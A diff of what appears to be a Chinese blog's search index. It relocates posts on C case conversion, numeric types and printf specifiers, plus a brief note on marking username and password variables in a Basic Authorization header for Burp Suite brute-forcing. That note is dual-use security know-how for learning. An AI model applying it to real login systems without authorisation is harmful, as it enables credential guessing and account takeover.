@@ -367,6 +367,223 @@
       </tags>
   </entry>
   <entry>
+    <title>bp爆破中的变量赋值</title>
+    <url>/2025/01/13/bp%E7%88%86%E7%A0%B4%E4%B8%AD%E7%9A%84%E5%8F%98%E9%87%8F%E8%B5%8B%E5%80%BC/</url>
+    <content><![CDATA[<h3 id="有关密码用户名的提交"><a href="#有关密码用户名的提交" class="headerlink" title="有关密码用户名的提交"></a>有关密码用户名的提交</h3><ul>
+<li>密码提交：<br>比如在web容器内部有输入框让你输入admin和密码,这些数据提交进去是在HTTP请求报文或HTTP请求头中的Authorization结构(用于身份验证和授权信息传递),<br>可以发现admin与password之间使用:隔开,并且注意编码格式。</li>
+<li>变量赋值的提醒<br>变量赋值是用$$分开的,两个$符号之间的字符即为变量的值,比如:</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Authorization: Basic §a§:§password§</span><br></pre></td></tr></table></figure>
+<p><strong>注释</strong>:这里把冒号放在a变量里面:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Authorization: Basic $a:$$password$</span><br></pre></td></tr></table></figure>
+<p>也符合HTTP协议的格式。怎么顺眼怎么来</p>
+]]></content>
+      <categories>
+        <category>web安全</category>
+      </categories>
+      <tags>
+        <tag>bp爆破</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>c语言操作题</title>
+    <url>/2025/03/02/c%E8%AF%AD%E8%A8%80%E6%93%8D%E4%BD%9C%E9%A2%98/</url>
+    <content><![CDATA[<h1 id="大小写的转化"><a href="#大小写的转化" class="headerlink" title="大小写的转化"></a>大小写的转化</h1><h2 id="利用-ASCII-码值的差值进行转换"><a href="#利用-ASCII-码值的差值进行转换" class="headerlink" title="利用 ASCII 码值的差值进行转换"></a>利用 ASCII 码值的差值进行转换</h2><ul>
+<li><strong>原理</strong>：在 ASCII 码表中，大写字母和小写字母的编码是有规律的。<strong>小写字母比对应的大写字母的 ASCII 码值大 32</strong> 。例如，‘A’ 的 ASCII 码值是 65 ，‘a’ 的 ASCII 码值是 97 。所以可以通过对字符的 ASCII 码值进行加减操作来实现大小写转换。</li>
+<li><strong>代码示例</strong>：</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> ch = <span class="string">&#x27;A&#x27;</span>;</span><br><span class="line">    <span class="comment">// 大写转小写</span></span><br><span class="line">    <span class="keyword">if</span> (ch &gt;= <span class="string">&#x27;A&#x27;</span> &amp;&amp; ch &lt;= <span class="string">&#x27;Z&#x27;</span>) &#123;</span><br><span class="line">        ch = ch + <span class="number">32</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;转换后的字符: %c\n&quot;</span>, ch);</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> ch2 = <span class="string">&#x27;b&#x27;</span>;</span><br><span class="line">    <span class="comment">// 小写转大写</span></span><br><span class="line">    <span class="keyword">if</span> (ch2 &gt;= <span class="string">&#x27;a&#x27;</span> &amp;&amp; ch2 &lt;= <span class="string">&#x27;z&#x27;</span>) &#123;</span><br><span class="line">        ch2 = ch2 - <span class="number">32</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;转换后的字符: %c\n&quot;</span>, ch2);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="使用标准库函数-tolower-和-toupper"><a href="#使用标准库函数-tolower-和-toupper" class="headerlink" title="使用标准库函数 tolower() 和 toupper()"></a>使用标准库函数 <code>tolower()</code> 和 <code>toupper()</code></h2><ul>
+<li><strong>原理</strong>：C 语言的标准库 <code>&lt;ctype.h&gt;</code> 提供了 <code>tolower()</code> 和 <code>toupper()</code> 函数来进行字符大小写转换。<code>tolower()</code> 函数会将给定的字符转换为小写形式（如果该字符是大写字母 ），<code>toupper()</code> 函数会将给定的字符转换为大写形式（如果该字符是小写字母 ）。如果字符本身不是字母，函数会直接返回原字符。</li>
+<li><strong>代码示例</strong>：</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> ch = <span class="string">&#x27;A&#x27;</span>;</span><br><span class="line">    <span class="comment">// 大写转小写</span></span><br><span class="line">    ch = <span class="built_in">tolower</span>(ch);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;转换后的字符: %c\n&quot;</span>, ch);</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> ch2 = <span class="string">&#x27;b&#x27;</span>;</span><br><span class="line">    <span class="comment">// 小写转大写</span></span><br><span class="line">    ch2 = <span class="built_in">toupper</span>(ch2);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;转换后的字符: %c\n&quot;</span>, ch2);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="对字符串中的字符进行大小写转换"><a href="#对字符串中的字符进行大小写转换" class="headerlink" title="对字符串中的字符进行大小写转换"></a>对字符串中的字符进行大小写转换</h2><p>如果要对字符串中的所有字符进行大小写转换，可以结合循环和上述方法来实现。</p>
+<ul>
+<li><strong>利用 ASCII 码值差值的示例</strong>：</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> str[<span class="number">100</span>] = <span class="string">&quot;Hello World&quot;</span>;</span><br><span class="line">    <span class="type">int</span> len = <span class="built_in">strlen</span>(str);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (str[i] &gt;= <span class="string">&#x27;A&#x27;</span> &amp;&amp; str[i] &lt;= <span class="string">&#x27;Z&#x27;</span>) &#123;</span><br><span class="line">            str[i] = str[i] + <span class="number">32</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (str[i] &gt;= <span class="string">&#x27;a&#x27;</span> &amp;&amp; str[i] &lt;= <span class="string">&#x27;z&#x27;</span>) &#123;</span><br><span class="line">            str[i] = str[i] - <span class="number">32</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;转换后的字符串: %s\n&quot;</span>, str);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>利用标准库函数的示例</strong>：</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> str[<span class="number">100</span>] = <span class="string">&quot;Hello World&quot;</span>;</span><br><span class="line">    <span class="type">int</span> len = <span class="built_in">strlen</span>(str);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">isupper</span>(str[i])) &#123;</span><br><span class="line">            str[i] = <span class="built_in">tolower</span>(str[i]);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">islower</span>(str[i])) &#123;</span><br><span class="line">            str[i] = <span class="built_in">toupper</span>(str[i]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;转换后的字符串: %s\n&quot;</span>, str);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>c语言</category>
+      </categories>
+      <tags>
+        <tag>计算机二级</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>c语言数值类型与字长的理解</title>
+    <url>/2025/01/17/c%E8%AF%AD%E8%A8%80%E6%95%B0%E5%80%BC%E7%B1%BB%E5%9E%8B%E4%B8%8E%E5%AD%97%E9%95%BF%E7%9A%84%E7%90%86%E8%A7%A3/</url>
+    <content><![CDATA[<h2 id="c语言数据类型"><a href="#c语言数据类型" class="headerlink" title="c语言数据类型"></a>c语言数据类型</h2><h3 id="数据声明与字长"><a href="#数据声明与字长" class="headerlink" title="数据声明与字长"></a>数据声明与字长</h3><p>1.首先字长是计算机可以处理的二进制数的位数,字节是基本单位,一字节等于8位,1位是0或1。</p>
+<p>2.关于int,short,long,long long , unsigned声明与可处理二进制数位数的关系:</p>
+<p><strong>首先提醒:</strong></p>
+<p>如-3：可以表示为,10000011,其中最左边的那个数所在的位置叫<strong>符号位</strong>,在没有声明为unsigned的情况下,符号位默认为最左边那位二进制数所占位置,若有unsigned,则不存在符号位。</p>
+<p>eg:以64位计算机为例,int处理数据并将其转化为二进制数,为32位的二进制数,而long long 为至少为64位二进制数表示的数字<br>我的意思就是，如果拿应该给long声明处理的超大数据,在printf时使用%d占位符,不用%ld占位符,就会使这个数据被截断,即截断前32位表示成10进制数后输出,不能通过完整的64位二进制数转化位十进制数后输出</p>
+<p>3.当然%d可以完整输出的数据,用%ld也可以完整输出,没问题的</p>
+<h3 id="源码反码和补码"><a href="#源码反码和补码" class="headerlink" title="源码反码和补码"></a>源码反码和补码</h3><p>1.首先,我们说说,int表示的最大正数数&#x2F;最小负数是多少,(64位操作系统的情况下)根据二进制和十进制的转换:</p>
+<p>正数的范围：最大的正数是符号位为0，其余位全为1的情况。对于 32 位的int，最大正数的二进制表示为01111111 11111111 11111111 11111111。</p>
+<p>如下图:</p>
+<img src="/2025/01/17/c%E8%AF%AD%E8%A8%80%E6%95%B0%E5%80%BC%E7%B1%BB%E5%9E%8B%E4%B8%8E%E5%AD%97%E9%95%BF%E7%9A%84%E7%90%86%E8%A7%A3/image-20250117120319919-1737086604130-1.png" class="" title="image-20250117120319919">
+
+<p>对于有unsigned前缀声明的变量,没有符号位,32位都是二进制,所以直接2的32次幂。<br>所以最大整数就是:</p>
+<img src="/2025/01/17/c%E8%AF%AD%E8%A8%80%E6%95%B0%E5%80%BC%E7%B1%BB%E5%9E%8B%E4%B8%8E%E5%AD%97%E9%95%BF%E7%9A%84%E7%90%86%E8%A7%A3/image-20250117151232436.png" class="" title="image-20250117151232436">
+
+<p>2.有关源码反码和补码<br>为了计算的方便,诞生了这个概念:<br>计算:<br>5-3&#x3D;2,在计算机内被转化为:<br>5+(-3)&#x3D;2<br>可能有些抽象,我先来定义一下这几个概念:</p>
+<img src="/2025/01/17/c%E8%AF%AD%E8%A8%80%E6%95%B0%E5%80%BC%E7%B1%BB%E5%9E%8B%E4%B8%8E%E5%AD%97%E9%95%BF%E7%9A%84%E7%90%86%E8%A7%A3/image-20250117151607539.png" class="" title="image-20250117151607539">
+
+<img src="/2025/01/17/c%E8%AF%AD%E8%A8%80%E6%95%B0%E5%80%BC%E7%B1%BB%E5%9E%8B%E4%B8%8E%E5%AD%97%E9%95%BF%E7%9A%84%E7%90%86%E8%A7%A3/image-20250117151620652.png" class="" title="image-20250117151620652">
+
+<p>在计算方面:</p>
+<p>5-3的计算,就相当于5的二进制数加上3的二进制数的补码,可以化减法为加法</p>
+<img src="/2025/01/17/c%E8%AF%AD%E8%A8%80%E6%95%B0%E5%80%BC%E7%B1%BB%E5%9E%8B%E4%B8%8E%E5%AD%97%E9%95%BF%E7%9A%84%E7%90%86%E8%A7%A3/image-20250117152207888.png" class="" title="image-20250117152207888">
+
+<h2 id="可移植类型-和"><a href="#可移植类型-和" class="headerlink" title="可移植类型:&lt;stdint.h&gt;和&lt;inttypes.h&gt;"></a>可移植类型:&lt;stdint.h&gt;和&lt;inttypes.h&gt;</h2><p>详细说明,见C prime plus教材48页<br><strong>这里进行补充:</strong></p>
+<p>1.这两种库的区别:</p>
+<img src="/2025/01/17/c%E8%AF%AD%E8%A8%80%E6%95%B0%E5%80%BC%E7%B1%BB%E5%9E%8B%E4%B8%8E%E5%AD%97%E9%95%BF%E7%9A%84%E7%90%86%E8%A7%A3/image-20250122120246573.png" class="" title="image-20250122120246573">
+
+<p>2.输出宏和占位符的区别:</p>
+<img src="/2025/01/17/c%E8%AF%AD%E8%A8%80%E6%95%B0%E5%80%BC%E7%B1%BB%E5%9E%8B%E4%B8%8E%E5%AD%97%E9%95%BF%E7%9A%84%E7%90%86%E8%A7%A3/image-20250122120353682.png" class="" title="image-20250122120353682">
+
+<h2 id="浮点数后缀解释"><a href="#浮点数后缀解释" class="headerlink" title="浮点数后缀解释"></a>浮点数后缀解释</h2><p>是的，正如你所理解的那样。如果你声明一个 <code>float</code> 类型的变量并给它赋一个没有加后缀 <code>f</code> 的浮点数（比如 <code>11.0</code>），那么这个数会被默认当作 <code>double</code> 类型来处理，而不是 <code>float</code>。这种情况下，虽然你声明的是 <code>float</code> 类型的变量，但浮点常量（比如 <code>11.0</code>）默认是 <code>double</code> 类型，所以在赋值时会发生隐式转换，将 <code>double</code> 转换为 <code>float</code>。</p>
+<h3 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h3><ul>
+<li><p><strong>没有 <code>f</code> 后缀时</strong>：<code>11.0</code> 被当作 <code>double</code> 类型。赋值给 <code>float</code> 类型变量时会发生类型转换（从 <code>double</code> 转为 <code>float</code>），这个过程中可能会有精度丢失，因为 <code>float</code> 的精度比 <code>double</code> 要低。</p>
+</li>
+<li><p><strong>加上 <code>f</code> 后缀时</strong>：<code>11.0f</code> 被明确当作 <code>float</code> 类型，直接赋值给 <code>float</code> 类型的变量时，没有类型转换，避免了精度损失。</p>
+</li>
+</ul>
+<h3 id="内存处理："><a href="#内存处理：" class="headerlink" title="内存处理："></a>内存处理：</h3><ul>
+<li>在内存中，<code>double</code> 类型的数据通常占 8 字节，而 <code>float</code> 类型占 4 字节。所以如果你不加 <code>f</code> 后缀，虽然变量是 <code>float</code>，但是你给它赋的 <code>double</code> 数值会先被存储为 <code>double</code>，然后再强制转换为 <code>float</code> 存储，可能会丢失一些精度。</li>
+</ul>
+<h3 id="举个例子："><a href="#举个例子：" class="headerlink" title="举个例子："></a>举个例子：</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">float</span> f_num = <span class="number">11.0</span>;     <span class="comment">// 11.0 默认是 double 类型</span></span><br><span class="line">    <span class="type">float</span> f_num_with_f = <span class="number">11.0f</span>;  <span class="comment">// 明确指定为 float 类型</span></span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;f_num: %.6f\n&quot;</span>, f_num);  <span class="comment">// 打印 float 类型的 f_num</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;f_num_with_f: %.6f\n&quot;</span>, f_num_with_f);  <span class="comment">// 打印明确指定为 float 的 f_num_with_f</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="结论："><a href="#结论：" class="headerlink" title="结论："></a>结论：</h3><ul>
+<li><strong>没有 <code>f</code> 后缀</strong>：浮点常量 <code>11.0</code> 会被视为 <code>double</code> 类型，赋值给 <code>float</code> 类型时会进行类型转换。</li>
+<li><strong>加上 <code>f</code> 后缀</strong>：常量被明确作为 <code>float</code> 类型，避免了隐式转换。</li>
+</ul>
+<p>这样，当你希望显式控制数据的类型时，加上后缀 <code>f</code> 是非常重要的，特别是在性能要求较高或精度敏感的场合。</p>
+<p>补充:</p>
+<p>你可以通过统一声明为 <code>float</code> 类型，并加上 <code>f</code> 后缀来控制常量的类型，这样可以避免隐式类型转换时造成的精度损失。</p>
+<p>然而，是否选择 <code>float</code> 作为默认类型，需要根据你的实际需求来判断。如果需要更高的精度，<code>double</code> 可能会是更好的选择，因为它的精度更高且范围更大。</p>
+<h2 id="转换说明-转换字符"><a href="#转换说明-转换字符" class="headerlink" title="转换说明(%转换字符)"></a>转换说明(%转换字符)</h2><p>在 C 语言中，浮点数的转换说明符（也叫转换字符）用于格式化 <code>float</code>、<code>double</code> 和 <code>long double</code> 类型的数据。以下是与浮点数相关的常见转换说明符：</p>
+<hr>
+<h3 id="1-f：标准浮点数表示"><a href="#1-f：标准浮点数表示" class="headerlink" title="1. %f：标准浮点数表示"></a>1. <strong><code>%f</code></strong>：标准浮点数表示</h3><ul>
+<li>用于以小数点形式显示浮点数。</li>
+<li>默认保留 6 位小数，可通过指定精度改变小数位数。</li>
+</ul>
+<h4 id="示例："><a href="#示例：" class="headerlink" title="示例："></a>示例：</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">float</span> f = <span class="number">3.14159</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%f\n&quot;</span>, f);  <span class="comment">// 输出：3.141590</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%.2f\n&quot;</span>, f); <span class="comment">// 输出：3.14（保留两位小数）</span></span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="2-e-或-E：科学计数法表示"><a href="#2-e-或-E：科学计数法表示" class="headerlink" title="2. %e 或 %E：科学计数法表示"></a>2. <strong><code>%e</code> 或 <code>%E</code></strong>：科学计数法表示</h3><ul>
+<li>用于以科学计数法（指数形式）表示浮点数。</li>
+<li><code>%e</code> 使用小写 <code>e</code> 表示指数，<code>%E</code> 使用大写 <code>E</code> 表示指数。</li>
+</ul>
+<h4 id="示例：-1"><a href="#示例：-1" class="headerlink" title="示例："></a>示例：</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">double</span> d = <span class="number">12345.6789</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%e\n&quot;</span>, d);  <span class="comment">// 输出：1.234568e+04</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%E\n&quot;</span>, d);  <span class="comment">// 输出：1.234568E+04</span></span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="3-g-或-G：自动选择简洁表示"><a href="#3-g-或-G：自动选择简洁表示" class="headerlink" title="3. %g 或 %G：自动选择简洁表示"></a>3. <strong><code>%g</code> 或 <code>%G</code></strong>：自动选择简洁表示</h3><ul>
+<li>自动在 <code>%f</code> 和 <code>%e</code> 之间选择最简洁的表示形式。</li>
+<li><code>%g</code> 使用小写 <code>e</code>，<code>%G</code> 使用大写 <code>E</code>（当选择科学计数法时）。</li>
+</ul>
+<h4 id="示例：-2"><a href="#示例：-2" class="headerlink" title="示例："></a>示例：</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">double</span> d = <span class="number">0.000123456</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%g\n&quot;</span>, d);  <span class="comment">// 输出：0.000123456（普通形式）</span></span><br><span class="line">d = <span class="number">123456.789</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%g\n&quot;</span>, d);  <span class="comment">// 输出：1.23457e+05（科学计数法）</span></span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="4-a-或-A：十六进制浮点数表示（C99-标准引入）"><a href="#4-a-或-A：十六进制浮点数表示（C99-标准引入）" class="headerlink" title="4. %a 或 %A：十六进制浮点数表示（C99 标准引入）"></a>4. <strong><code>%a</code> 或 <code>%A</code></strong>：十六进制浮点数表示（C99 标准引入）</h3><ul>
+<li>用于以十六进制表示浮点数，指数以 <code>p</code> 或 <code>P</code> 表示（表示 2 的幂次）。</li>
+<li><code>%a</code> 使用小写字母，<code>%A</code> 使用大写字母。</li>
+</ul>
+<h4 id="示例：-3"><a href="#示例：-3" class="headerlink" title="示例："></a>示例：</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">double</span> d = <span class="number">123.456</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%a\n&quot;</span>, d);  <span class="comment">// 输出：0x1.edd2f1a9fbe77p+6</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%A\n&quot;</span>, d);  <span class="comment">// 输出：0X1.EDD2F1A9FBE77P+6</span></span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="5-Lf、-Le、-Lg：用于-long-double"><a href="#5-Lf、-Le、-Lg：用于-long-double" class="headerlink" title="5. %Lf、%Le、%Lg：用于 long double"></a>5. <strong><code>%Lf</code>、<code>%Le</code>、<code>%Lg</code></strong>：用于 <code>long double</code></h3><ul>
+<li>当处理 <code>long double</code> 类型时，需要在标准说明符前加 <code>L</code> 前缀。<ul>
+<li><code>%Lf</code>：以小数点形式输出 <code>long double</code>。</li>
+<li><code>%Le</code>：以科学计数法输出 <code>long double</code>。</li>
+<li><code>%Lg</code>：以最简洁的形式输出 <code>long double</code>。</li>
+</ul>
+</li>
+</ul>
+<h4 id="示例：-4"><a href="#示例：-4" class="headerlink" title="示例："></a>示例：</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">long</span> <span class="type">double</span> ld = <span class="number">3.141592653589793238L</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%Lf\n&quot;</span>, ld);  <span class="comment">// 输出 long double 的值</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%Le\n&quot;</span>, ld);  <span class="comment">// 科学计数法表示</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%Lg\n&quot;</span>, ld);  <span class="comment">// 自动选择简洁表示</span></span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="6-宽度与精度控制"><a href="#6-宽度与精度控制" class="headerlink" title="6. 宽度与精度控制"></a>6. <strong>宽度与精度控制</strong></h3><p>可以通过格式说明符进一步控制输出的宽度和精度：</p>
+<ul>
+<li><strong><code>%m.nf</code></strong>：指定总宽度 <code>m</code> 和小数部分的位数 <code>n</code>。<ul>
+<li><code>m</code>：整个数值占的最小宽度，不足时补空格。</li>
+<li><code>n</code>：小数部分的位数。</li>
+</ul>
+</li>
+</ul>
+<h4 id="示例：-5"><a href="#示例：-5" class="headerlink" title="示例："></a>示例：</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">double</span> d = <span class="number">123.456</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%10.2f\n&quot;</span>, d);  <span class="comment">// 输出：    123.46（宽度 10，保留两位小数）</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%-10.2f\n&quot;</span>, d); <span class="comment">// 输出：123.46    （左对齐，宽度 10）</span></span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><table>
+<thead>
+<tr>
+<th>转换字符</th>
+<th align="left">含义</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>%f</code></td>
+<td align="left">按小数点形式输出浮点数</td>
+</tr>
+<tr>
+<td><code>%e</code>&#x2F;<code>%E</code></td>
+<td align="left">按科学计数法输出浮点数</td>
+</tr>
+<tr>
+<td><code>%g</code>&#x2F;<code>%G</code></td>
+<td align="left">自动选择 <code>%f</code> 或 <code>%e</code> 的简洁形式</td>
+</tr>
+<tr>
+<td><code>%a</code>&#x2F;<code>%A</code></td>
+<td align="left">按十六进制表示浮点数（C99）</td>
+</tr>
+<tr>
+<td><code>%Lf</code></td>
+<td align="left">以小数点形式输出 <code>long double</code></td>
+</tr>
+<tr>
+<td><code>%Le</code></td>
+<td align="left">以科学计数法输出 <code>long double</code></td>
+</tr>
+<tr>
+<td><code>%Lg</code></td>
+<td align="left">以最简洁形式输出 <code>long double</code></td>
+</tr>
+<tr>
+<td><code>%o</code></td>
+<td align="left">输出整数的八进制形式</td>
+</tr>
+<tr>
+<td><code>%#o</code></td>
+<td align="left">输出带有<code>0</code>前缀的八进制形式</td>
+</tr>
+<tr>
+<td>根据需要选择合适的格式化符来输出浮点数。</td>
+<td align="left"></td>
+</tr>
+<tr>
+<td>注意:float和double都是用%e或%E直接表示科学计数法形式</td>
+<td align="left"></td>
+</tr>
+</tbody></table>
+]]></content>
+      <categories>
+        <category>c语言</category>
+      </categories>
+      <tags>
+        <tag>c语言数据类型</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>ai网安民警知识问答系统更新调试日志</title>
     <url>/2025/02/25/ai%E7%BD%91%E5%AE%89%E6%B0%91%E8%AD%A6%E7%9F%A5%E8%AF%86%E9%97%AE%E7%AD%94%E7%B3%BB%E7%BB%9F%E6%9B%B4%E6%96%B0%E8%B0%83%E8%AF%95%E6%97%A5%E5%BF%97/</url>
     <content><![CDATA[<h1 id="ai网安民警知识问答系统更新调试日志"><a href="#ai网安民警知识问答系统更新调试日志" class="headerlink" title="ai网安民警知识问答系统更新调试日志"></a>ai网安民警知识问答系统更新调试日志</h1><h2 id="25-2-25"><a href="#25-2-25" class="headerlink" title="25.2.25"></a>25.2.25</h2><p><strong>状态:</strong></p>
@@ -1047,223 +1264,6 @@
       </tags>
   </entry>
   <entry>
-    <title>bp爆破中的变量赋值</title>
-    <url>/2025/01/13/bp%E7%88%86%E7%A0%B4%E4%B8%AD%E7%9A%84%E5%8F%98%E9%87%8F%E8%B5%8B%E5%80%BC/</url>
-    <content><![CDATA[<h3 id="有关密码用户名的提交"><a href="#有关密码用户名的提交" class="headerlink" title="有关密码用户名的提交"></a>有关密码用户名的提交</h3><ul>
-<li>密码提交：<br>比如在web容器内部有输入框让你输入admin和密码,这些数据提交进去是在HTTP请求报文或HTTP请求头中的Authorization结构(用于身份验证和授权信息传递),<br>可以发现admin与password之间使用:隔开,并且注意编码格式。</li>
-<li>变量赋值的提醒<br>变量赋值是用$$分开的,两个$符号之间的字符即为变量的值,比如:</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Authorization: Basic §a§:§password§</span><br></pre></td></tr></table></figure>
-<p><strong>注释</strong>:这里把冒号放在a变量里面:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Authorization: Basic $a:$$password$</span><br></pre></td></tr></table></figure>
-<p>也符合HTTP协议的格式。怎么顺眼怎么来</p>
-]]></content>
-      <categories>
-        <category>web安全</category>
-      </categories>
-      <tags>
-        <tag>bp爆破</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>c语言操作题</title>
-    <url>/2025/03/02/c%E8%AF%AD%E8%A8%80%E6%93%8D%E4%BD%9C%E9%A2%98/</url>
-    <content><![CDATA[<h1 id="大小写的转化"><a href="#大小写的转化" class="headerlink" title="大小写的转化"></a>大小写的转化</h1><h2 id="利用-ASCII-码值的差值进行转换"><a href="#利用-ASCII-码值的差值进行转换" class="headerlink" title="利用 ASCII 码值的差值进行转换"></a>利用 ASCII 码值的差值进行转换</h2><ul>
-<li><strong>原理</strong>：在 ASCII 码表中，大写字母和小写字母的编码是有规律的。<strong>小写字母比对应的大写字母的 ASCII 码值大 32</strong> 。例如，‘A’ 的 ASCII 码值是 65 ，‘a’ 的 ASCII 码值是 97 。所以可以通过对字符的 ASCII 码值进行加减操作来实现大小写转换。</li>
-<li><strong>代码示例</strong>：</li>
-</ul>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> ch = <span class="string">&#x27;A&#x27;</span>;</span><br><span class="line">    <span class="comment">// 大写转小写</span></span><br><span class="line">    <span class="keyword">if</span> (ch &gt;= <span class="string">&#x27;A&#x27;</span> &amp;&amp; ch &lt;= <span class="string">&#x27;Z&#x27;</span>) &#123;</span><br><span class="line">        ch = ch + <span class="number">32</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;转换后的字符: %c\n&quot;</span>, ch);</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> ch2 = <span class="string">&#x27;b&#x27;</span>;</span><br><span class="line">    <span class="comment">// 小写转大写</span></span><br><span class="line">    <span class="keyword">if</span> (ch2 &gt;= <span class="string">&#x27;a&#x27;</span> &amp;&amp; ch2 &lt;= <span class="string">&#x27;z&#x27;</span>) &#123;</span><br><span class="line">        ch2 = ch2 - <span class="number">32</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;转换后的字符: %c\n&quot;</span>, 